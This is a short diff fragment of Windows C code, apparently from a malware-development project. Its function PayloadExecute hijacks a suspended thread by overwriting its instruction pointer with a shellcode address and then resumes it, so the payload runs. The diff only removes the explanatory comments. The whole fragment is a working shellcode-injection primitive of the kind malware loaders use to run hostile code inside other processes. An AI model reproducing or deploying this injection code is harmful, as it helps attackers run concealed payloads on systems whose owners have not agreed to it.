@@ -34,22 +34,18 @@ BOOL PayloadExecute(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, 
 		.ContextFlags = CONTEXT_CONTROL
 	};
 
-	// getting the original thread context
 	if (!GetThreadContext(hThread, &ThreadCtx)) {
 		printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
- 	// updating the next instruction pointer to be equal to our shellcode's address 
 	ThreadCtx.Rip = (DWORD64)*ppAddress;
   
-	// setting the new updated thread context
 	if (!SetThreadContext(hThread, &ThreadCtx)) {
 		printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
-	// resuming suspended thread, thus running our payload
 	ResumeThread(hThread);
 	
     // Just for testing purposes (TO REMOVE)
